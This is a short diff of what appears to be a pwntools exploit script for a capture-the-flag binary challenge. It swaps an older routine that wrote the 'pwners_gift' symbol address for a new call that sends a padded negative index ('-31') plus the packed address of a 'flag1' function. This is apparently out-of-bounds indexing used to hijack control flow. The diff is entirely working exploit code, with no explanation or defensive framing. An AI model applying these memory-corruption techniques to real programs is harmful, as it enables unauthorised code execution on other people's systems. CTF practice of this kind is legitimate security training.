@@ -19,20 +19,17 @@ debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")
 # one_gadgets: list = get_current_one_gadget_from_libc(more=False)
 CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)
 
-def call_func(choice, off=0, length=0):
-    ru(b'Give me your choice:\n')
-    sl(i2b(choice))
-    ru(b"Where'd you love to start?\n")
-    sl(i2b(off))
-    if (choice == 1):
-        ru(b"How much do you want to write?")
-        sl(i2b(length))
+def cmd(data):
+    ru(b'cmd> ')
+    sl(data)
+def call_func(data, idx, key=b""):
+    cmd(data)
+    ru(b'offset: ')
+    sl(i2b(idx))
+    if data[:2] == b"1\x00":
+        ru(b'data: ')
+        sl(key)
 
-def flag1():
-    call_func(1, 0xf8, 8)
-    s(p64(elf.symbols['pwners_gift']))
-    call_func(-1)
-
-flag1()
+call_func(b"-31\x00".ljust(8, b"\x00") + p64(elf.symbols["flag1"]), 0)
 
 ia()
